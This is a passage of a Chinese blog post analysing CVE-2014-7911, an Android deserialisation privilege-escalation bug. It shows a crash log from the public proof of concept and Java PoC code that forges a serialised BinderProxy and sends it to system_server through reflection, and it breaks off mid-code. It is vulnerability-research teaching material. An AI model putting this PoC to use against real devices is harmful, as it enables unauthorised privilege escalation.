
<!doctype html>
<html class="theme-next use-motion theme-next-mala">
<head>
  

<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />


  <meta name="google-site-verification" content="DRmBBL5LYsJ_2wCsJIYYsBfu8hVW8DQYzmpqGMp-njU" />





  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>




<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1"/>


    <meta name="description" content="水中月.镜中花.浮华一片苍凉.." />



  <meta name="keywords" content="cve," />



  <link rel="alternate" href="/atom.xml" title="idhyt's blog" type="application/atom+xml" />



  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />


<meta name="description" content="简介CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令，影响版本包括4.4以前所有的版本。该漏洞是一个非常有学习价值的漏洞，其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。
该漏洞的成因在于ja">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2014-7911安卓本地提权漏洞分析">
<meta property="og:url" content="http://blog.idhyt.com/2015/07/31/exploit-cve-2014-7911/index.html">
<meta property="og:site_name" content="idhyt's blog">
<meta property="og:description" content="简介CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令，影响版本包括4.4以前所有的版本。该漏洞是一个非常有学习价值的漏洞，其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。
该漏洞的成因在于ja">
<meta property="og:updated_time" content="2016-02-19T09:42:32.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2014-7911安卓本地提权漏洞分析">
<meta name="twitter:description" content="简介CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令，影响版本包括4.4以前所有的版本。该漏洞是一个非常有学习价值的漏洞，其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。
该漏洞的成因在于ja">


<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: 'Mala',
    sidebar: 'post'
  };
</script>

  <title> CVE-2014-7911安卓本地提权漏洞分析 | idhyt's blog </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-71783676-1', 'auto');
  ga('send', 'pageview');
</script>


  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?5228d77c5752954f270fcca0908555af";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>



  <div class="container one-column page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><h1 class="site-meta">
  <span class="logo-line-before"><i></i></span>
  <a href="/" class="brand" rel="start">
      <span class="logo">
        <i class="icon-next-logo"></i>
      </span>
      <span class="site-title">云淡风轻</span>
  </a>
  <span class="logo-line-after"><i></i></span>
</h1>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu menu-left">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            <i class="menu-item-icon icon-next-home"></i> <br />
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            <i class="menu-item-icon icon-next-categories"></i> <br />
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            <i class="menu-item-icon icon-next-archives"></i> <br />
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            <i class="menu-item-icon icon-next-tags"></i> <br />
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            <i class="menu-item-icon icon-next-about"></i> <br />
            关于
          </a>
        </li>
      

      
      
    </ul>
  

  
    <div class="site-search">
      
  
  <form class="site-search-form">
    <input type="text" id="st-search-input" class="st-search-input st-default-search-input" />
  </form>


<script type="text/javascript">
  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
    (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
    e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');

  _st('install', 'sVJDxDCDcUGeK1KkM6zN','2.0.0');
</script>



    </div>
  
</nav>

 </div>
    </header>

    
      

      
        <style type="text/css">

    .circle {
        width: 40px;
        height: 40px;
        background: #555 no-repeat;
        cursor: move;
    }

    .assist-btn {
        position: fixed;
        top: 50％;
        left: 10px;
        -moz-border-radius: 50px;
        -webkit-border-radius: 50px;
        border-radius: 50px;
        outline: none;
        border: none;
        color: #87daff;
    }

</style>

<script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
<script type="text/javascript">
    // 浮动圆点展开与收缩
    /*
    $(function () {
        var assist_box = $('.assist-box');
        $('#assist_btn').hover(function () {
            assist_box.stop().show(300);
        }, function () {
            assist_box.stop().hide(150);
        })
    });
    */  
    //浮动圆点拖动
    $(function () {
        var box = document.getElementById('assist_btn');
        box.onmousedown = function (event) {
            var e = event || window.event,
                t = e.target || e.srcElement,
                // 鼠标按下时的坐标x1,y1
                x1 = e.clientX,
                y1 = e.clientY,
                //鼠标按下时的左右偏移量
                dragLeft = this.offsetLeft,
                dragTop = this.offsetTop;

            document.onmousemove = function (event) {
                var e = event || window.event,
                    t = e.target || e.srcElement,
                    // 鼠标移动时的动态坐标
                    x2 = e.clientX,
                    y2 = e.clientY,
                    // 鼠标移动时的坐标的变化量
                    x = x2 - x1,
                    y = y2 - y1;
                box.style.left = (dragLeft + x) + 'px';
                box.style.top = (dragTop + y) + 'px';
            }

            document.onmouseup = function () {
                this.onmousemove = null;
            }
        }
    });

/*
    $whitesmoke   = #f5f5f5
    $gainsboro    = #eee
    $gray-lighter = #ddd
    $grey-light   = #ccc
    $grey         = #bbb
    $grey-dark    = #999
    $grey-dim     = #666
    $black-light  = #555
    $black-deep   = #222
    $red          = #ff2a2a
    $blue-bright  = #87daff
    $blue         = #0684bd
    $blue-deep    = #262a30
*/
    // white theme
    var body = {color: "#555", background: "white"};
    var a_tag = {color: "#222"};
    var header = { background: "#f5f5f5"};
    var logo_line_i = {background: "#222"};
    // var post_code = {background: "#eee", color: "#222"};

    function switch_theme() {
        $("body").css(body);
        $("a:not('.links-of-author-item a, .site-state-item a, .site-state-posts a, .feed-link a, .motion-element a, .post-tags a, .show-commit-cls a, #donate_board a')").css(a_tag);
        $(".header, .footer").css(header);
        $(".logo-line-before i, .logo-line-after i").css(logo_line_i);
        //$(".post code").css(post_code);
        $("#idhyt-surprise-ball #idhyt-surprise-ball-animation .drag").css(a_tag);
        $(".post-title-link, .posts-expand .post-meta, .post-comments-count, .disqus-comment-count, .post-category a, .post-nav-next a, .post-nav-item a").css(a_tag);
        
        // $("code").css({color: '#c5c8c6', background: '#1d1f21'});
        $("#assist_btn").hide(1500);
    }

    $(function () {
        $("#assist_btn").dblclick(function() {
            switch_theme();
        });
    });

</script>

<div>

    <button class="assist-btn circle" id="assist_btn" title="双击切换">
        亮
    </button>

</div>









      

    

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content"> 

  <div id="posts" class="posts-expand">
    

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              CVE-2014-7911安卓本地提权漏洞分析
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          发表于
          <time itemprop="dateCreated" datetime="2015-07-31T23:28:11+08:00" content="2015-07-31">
            2015-07-31
          </time>
        </span>

        
          <span class="post-category" >
            &nbsp; | &nbsp; 分类于
            
              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                <a href="/categories/exploit/" itemprop="url" rel="index">
                  <span itemprop="name">exploit</span>
                </a>
              </span>

              
              

            
          </span>
        

        
          
            <span class="post-comments-count">
            &nbsp; | &nbsp;
            <a href="/2015/07/31/exploit-cve-2014-7911/#comments" itemprop="discussionUrl">
              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/07/31/exploit-cve-2014-7911/" itemprop="commentsCount"></span>
            </a>
          </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        <span itemprop="articleBody"><h2 id="简介">简介</h2><p>CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令，影响版本包括4.4以前所有的版本。该漏洞是一个非常有学习价值的漏洞，其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。</p>
<p>该漏洞的成因在于java.io.ObjectInputStream类在反序列化输入的数据时，并不验证其合法性，攻击者可以利用此漏洞构造恶意对象在sysem_server进程中执行任意代码并获取提升的权限。但是我google大部分关于这个漏洞的文章，没有一个分析文章能将漏洞的触发流程与这个点串起来的逻辑，或者说文章中根本就没有在提及这个点，这个过程发生在sysem_server处理Parcel数据的时候有个unparcel过程，下边会有详细的逻辑流程。</p>
<h2 id="调试环境和工具">调试环境和工具</h2><p>nexus 5<br>android 4.4<br>android studio</p>
<h2 id="漏洞触发">漏洞触发</h2><h3 id="触发">触发</h3><p>先下载漏洞<a href="http://seclists.org/fulldisclosure/2014/Nov/51" target="_blank" rel="external">poc</a>编译过后安装到手机中，一定要拿实体机测试，在genymotion等虚拟机中无法通过反射获取到系统服务。</p>
<p>清除日志 adb logcat -c<br>开启日志 adb logcat<br>运行poc，手机重启，查看崩溃日志</p>
<pre><code>--------- <span class="keyword">beginning </span>of /dev/log/main
I/System.out(<span class="number">10603</span>): <span class="number">1</span> inner classes found
I/System.out(<span class="number">10603</span>): <span class="number">1</span> inner classes found
D/audio_hw_primary( <span class="number">8448</span>): <span class="keyword">select_devices: </span>out_snd_device(<span class="number">2</span>: speaker) in_snd_device(<span class="number">0</span>: )
--------- <span class="keyword">beginning </span>of /dev/log/system
E/UserManagerService( <span class="number">8753</span>): Error writing application restrictions list
D/dalvikvm( <span class="number">8753</span>): GC_FOR_ALLOC freed <span class="number">134</span>K, <span class="number">4</span>% free <span class="number">24602</span>K/<span class="number">25472</span>K, paused <span class="number">32</span>ms, total <span class="number">32</span>ms
F/libc    ( <span class="number">8753</span>): Fatal signal <span class="number">11</span> (SIGSEGV) at <span class="number">0x1337bef3</span> (<span class="preprocessor">code</span><span class="number">=1</span>), thread <span class="number">8761</span> (FinalizerDaemon)
D/dalvikvm( <span class="number">8753</span>): GC_FOR_ALLOC freed <span class="number">856</span>K, <span class="number">7</span>% free <span class="number">24582</span>K/<span class="number">26312</span>K, paused <span class="number">31</span>ms, total <span class="number">31</span>ms
D/dalvikvm( <span class="number">8753</span>): GC_FOR_ALLOC freed <span class="number">836</span>K, <span class="number">7</span>% free <span class="number">24582</span>K/<span class="number">26312</span>K, paused <span class="number">35</span>ms, total <span class="number">35</span>ms
I/ActivityManager( <span class="number">8753</span>): START u0 {act<span class="label">=android</span>.intent.action.MAIN cat=[<span class="keyword">android.intent.category.HOME] </span>flg<span class="number">=0x10200000</span> <span class="keyword">cmp=com.google.android.googlequicksearchbox/com.google.android.launcher.GEL} </span>from pid <span class="number">8753</span>
D/audio_hw_primary( <span class="number">8448</span>): <span class="keyword">select_devices: </span>out_snd_device(<span class="number">2</span>: speaker) in_snd_device(<span class="number">0</span>: )
I/DEBUG   (  <span class="number">175</span>): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
I/DEBUG   (  <span class="number">175</span>): <span class="keyword">Build </span>fingerprint: <span class="string">'google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys'</span>
I/DEBUG   (  <span class="number">175</span>): <span class="keyword">Revision: </span><span class="string">'11'</span>
I/DEBUG   (  <span class="number">175</span>): pid: <span class="number">8753</span>, tid: <span class="number">8761</span>, name: FinalizerDaemon  &gt;&gt;&gt; system_server &lt;&lt;&lt;
I/DEBUG   (  <span class="number">175</span>): signal <span class="number">11</span> (SIGSEGV), <span class="preprocessor">code</span> <span class="number">1</span> (SEGV_MAPERR), fault <span class="keyword">addr </span><span class="number">1337</span>bef3
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">r0</span> <span class="number">1337</span>beef  <span class="literal">r1</span> <span class="number">401899</span><span class="literal">d9</span>  <span class="literal">r2</span> <span class="number">71082008</span>  <span class="literal">r3</span> <span class="number">6</span>d468dc4
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">r4</span> <span class="number">401899</span><span class="literal">d9</span>  <span class="literal">r5</span> <span class="number">1337</span>beef  <span class="literal">r6</span> <span class="number">713</span>c12e8  <span class="literal">r7</span> <span class="number">1337</span>beef
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">r8</span> <span class="number">1337</span>beef  <span class="literal">r9</span> <span class="number">746</span>daf68  <span class="literal">sl</span> <span class="number">71082018</span>  <span class="literal">fp</span> <span class="number">74</span>a7eb24
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">ip</span> <span class="number">401</span>c18a4  <span class="literal">sp</span> <span class="number">74</span>a7eae8  <span class="literal">lr</span> <span class="number">40188981</span>  <span class="literal">pc</span> <span class="number">400</span>d6176  <span class="keyword">cpsr </span><span class="number">200</span>f0030
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d0</span>  <span class="number">0000000000000001</span>  <span class="literal">d1</span>  <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d2</span>  <span class="number">6</span>d4aece800000000  <span class="literal">d3</span>  <span class="number">0000010000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d4</span>  <span class="number">0000000000000000</span>  <span class="literal">d5</span>  <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d6</span>  <span class="number">0000000000000000</span>  <span class="literal">d7</span>  <span class="number">42</span>c800004bb98bb4
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d8</span>  <span class="number">0000000000000000</span>  <span class="literal">d9</span>  <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d10</span> <span class="number">0000000000000000</span>  <span class="literal">d11</span> <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d12</span> <span class="number">0000000000000000</span>  <span class="literal">d13</span> <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d14</span> <span class="number">0000000000000000</span>  <span class="literal">d15</span> <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d16</span> ffffffff00000013  <span class="literal">d17</span> <span class="number">00000006</span>ffffffff
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d18</span> <span class="number">0000000000000000</span>  <span class="literal">d19</span> <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d20</span> <span class="number">0000000000000000</span>  <span class="literal">d21</span> <span class="number">0002000200020002</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d22</span> <span class="number">0000000000000000</span>  <span class="literal">d23</span> <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d24</span> <span class="number">0000000000000000</span>  <span class="literal">d25</span> <span class="number">0002</span>a7600002a760
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d26</span> <span class="number">0707070703030303</span>  <span class="literal">d27</span> <span class="number">0300000004000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d28</span> <span class="number">0800000009000000</span>  <span class="literal">d29</span> <span class="number">0001000000010000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d30</span> <span class="number">010</span>b400001088000  <span class="literal">d31</span> <span class="number">01108000010</span>e0000
I/DEBUG   (  <span class="number">175</span>):     scr <span class="number">60000010</span>
I/DEBUG   (  <span class="number">175</span>):
I/DEBUG   (  <span class="number">175</span>): <span class="keyword">backtrace:
</span>I/DEBUG   (  <span class="number">175</span>):     <span class="number">#00</span>  <span class="literal">pc</span> <span class="number">0000</span>d176  /system/lib/libutils.so (<span class="keyword">android::RefBase::decStrong(void </span>const*) const+<span class="number">3</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#01</span>  <span class="literal">pc</span> <span class="number">0007097</span>d  /system/lib/libandroid_runtime.so
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#02</span>  <span class="literal">pc</span> <span class="number">0001</span>dbcc  /system/lib/libdvm.so (dvmPlatformInvoke+<span class="number">112</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#03</span>  <span class="literal">pc</span> <span class="number">0004</span>e123  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+<span class="number">398</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#04</span>  <span class="literal">pc</span> <span class="number">00026</span>fe0  /system/lib/libdvm.so
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#05</span>  <span class="literal">pc</span> <span class="number">0002</span>dfa0  /system/lib/libdvm.so (dvmMterpStd(Thread*)+<span class="number">76</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#06</span>  <span class="literal">pc</span> <span class="number">0002</span>b638  /system/lib/libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+<span class="number">184</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#07</span>  <span class="literal">pc</span> <span class="number">0006057</span>d  /system/lib/libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, <span class="keyword">bool, </span>JValue*, std::__va_list)+<span class="number">336</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#08</span>  <span class="literal">pc</span> <span class="number">000605</span><span class="literal">a1</span>  /system/lib/libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+<span class="number">20</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#09</span>  <span class="literal">pc</span> <span class="number">00055287</span>  /system/lib/libdvm.so
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#10</span>  <span class="literal">pc</span> <span class="number">0000</span>d170  /system/lib/libc.so (__thread_entry+<span class="number">72</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#11</span>  <span class="literal">pc</span> <span class="number">0000</span>d308  /system/lib/libc.so (pthread_create+<span class="number">240</span>)
<span class="label">...</span>
</code></pre><h3 id="崩溃日志">崩溃日志</h3><p>简单说下崩溃日志格式</p>
<ol>
<li>ndk crash log以<strong><em> </em></strong> <strong><em> </em></strong> <em>*</em>开始. </li>
<li>第一行Build fingerprint: ‘google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys’ 指明了运行的Android版本, 如果您有多份crash dump的话这个信息就比较有用了。</li>
<li>接着一行显示的是当前的线程id(pid)和进程id(tid). 如果当前崩溃的线程是主线程的话, pid和tid会是一样的。</li>
<li>第四行, 显示的是unix信号. 这里的signal 11，即SIGSEGV，表示段错误，是最常见的信号。(SIGSEGV自行google) </li>
<li>接下来的部分是系统寄存器的dump信息。</li>
<li>Crash dump还包含PC之前和之后的一些内存字段. </li>
<li>最后是崩溃时的调用堆栈，如果你执行的是debug版本，还能还原一些c++代码。</li>
</ol>
<h3 id="几个重要的寄存器">几个重要的寄存器</h3><ol>
<li>r0-r3 用作传入函数参数，传出函数返回值。当参数不超过4个时,可以使用寄存器R0~R3来进行参数传递，当参数超过4个时，使用数据栈来传递参数；结果为一个32位的整数时，通过寄存器r0返回；结果为一个64位整数时，通过寄存器r0，r1返回。另外很重要的一点，在C++中，第一个参数就是this指针，所以this指针是存放在r0中的。</li>
<li>r4-r11 被用来存放函数的局部变量。</li>
<li>fp (or r11) 指向当前正在执行的函数的堆栈底。</li>
<li>sp (or r13) 当前正在执行的函数的堆栈顶.(跟fp相对应)</li>
<li>lr (or r14) link register. 简单来说，当当前指令执行完了，就会从这个寄存器获取地址，来知道需要返回，到哪里继续执行。</li>
<li>pc (or r15) program counter. 程序计数器。</li>
</ol>
<h2 id="漏洞POC分析">漏洞POC分析</h2><p>从上边崩溃日志中看出，system_server执行到0x1337bef3地址后触发<code>Error writing application restrictions list</code>写错误，最终造成了崩溃。</p>
<h3 id="漏洞触发过程">漏洞触发过程</h3><p>结合崩溃信息看poc源码，源码触发过程如下：</p>
<p>1.创建可序列化的对象AAdroid.os.BinderProxy并将其放入Bundle数据中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Bundle bundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">BinderProxy evilProxy = <span class="keyword">new</span> BinderProxy();</span><br><span class="line">evilProxy.mOrgue = staticAddr;</span><br><span class="line">evilProxy.mObject = staticAddr;</span><br><span class="line">bundle.putSerializable(<span class="string">"eatthis"</span>, evilProxy);</span><br></pre></td></tr></table></figure>
<p>类AAdroid.os.BinderProxy代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinderProxy</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> mObject = <span class="number">0x1337beef</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> mOrgue = <span class="number">0x1337beef</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意其中两个可控的成员变量mObject和mOrgue分别赋值0x1337beef，正是崩溃点。</p>
<p>2.通过一系列java的反射机制，获得跨进程调用system_server的IBinder接口mRemote，为与system_server的跨进程通信做准备。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取类对象android.os.IUserManager.Stub</span></span><br><span class="line">Class stubClass = <span class="keyword">null</span>;</span><br><span class="line">Class[] umSubclasses = Class.forName(<span class="string">"android.os.IUserManager"</span>).getDeclaredClasses();</span><br><span class="line">System.out.println(umSubclasses.length + <span class="string">" inner classes found"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Class inner : umSubclasses) &#123;</span><br><span class="line">    <span class="keyword">if</span> (inner.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub"</span>)) &#123;</span><br><span class="line">        stubClass = inner;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取对象android.os.IUserManager.Stub中TRANSACTION_setApplicationRestrictions的值用于transact()</span></span><br><span class="line">Field TRANSACTION_setApplicationRestrictionsField = stubClass.getDeclaredField(<span class="string">"TRANSACTION_setApplicationRestrictions"</span>);</span><br><span class="line">TRANSACTION_setApplicationRestrictionsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">TRANSACTION_setApplicationRestrictions = TRANSACTION_setApplicationRestrictionsField.getInt(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取类对象android.os.IUserManager.Stub.Proxy</span></span><br><span class="line">Class proxyClass = <span class="keyword">null</span>;</span><br><span class="line">Class[] umStubclasses = stubClass.getDeclaredClasses();</span><br><span class="line">System.out.println(umStubclasses.length + <span class="string">" inner classes found"</span>);</span><br><span class="line"><span class="keyword">for</span> (Class inner : umStubclasses) &#123;</span><br><span class="line">    <span class="keyword">if</span> (inner.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub.Proxy"</span>)) &#123;</span><br><span class="line">        proxyClass = inner;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取UserManager类对象实例</span></span><br><span class="line">UserManager userManager = (UserManager) context.getSystemService(Context.USER_SERVICE);</span><br><span class="line"><span class="comment">// 获取UserManager类对象中mService对象, 类型为IUserManager</span></span><br><span class="line">Field mServiceField = UserManager.class.getDeclaredField(<span class="string">"mService"</span>);</span><br><span class="line">mServiceField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 获取UserManager类对象实例中的mService对象值</span></span><br><span class="line">Object mService = mServiceField.get(userManager);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取类对象android.os.IUserManager.Stub.Proxy中的mRemote对象</span></span><br><span class="line">Field mRemoteField = proxyClass.getDeclaredField(<span class="string">"mRemote"</span>);</span><br><span class="line">mRemoteField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 获取获取类型为IUserManager的实例对象mService对象值</span></span><br><span class="line">mRemote = (IBinder) mRemoteField.get(mService);</span><br></pre></td></tr></table></figure>
<p>3.调用setApplicationRestrictions函数，传入之前打包evilproxy的Bundle数据作为参数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setApplicationRestrictions</span><span class="params">(java.lang.String packageName, android.os.Bundle restrictions, <span class="keyword">int</span></span><br><span class="line">            userHandle)</span> <span class="keyword">throws</span> android.os.RemoteException </span>&#123;</span><br><span class="line">    android.os.Parcel _data = android.os.Parcel.obtain();</span><br><span class="line">    android.os.Parcel _reply = android.os.Parcel.obtain();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        _data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">        _data.writeString(packageName);</span><br><span class="line">        _data.writeInt(<span class="number">1</span>);</span><br><span class="line">        restrictions.writeToParcel(_data, <span class="number">0</span>);</span><br><span class="line">        _data.writeInt(userHandle);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] data = _data.marshall();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; <span class="keyword">true</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data[i] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">1</span>] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">2</span>] == <span class="string">'d'</span> &amp;&amp; data[i+<span class="number">3</span>] == <span class="string">'r'</span>) &#123;</span><br><span class="line">                data[i] = <span 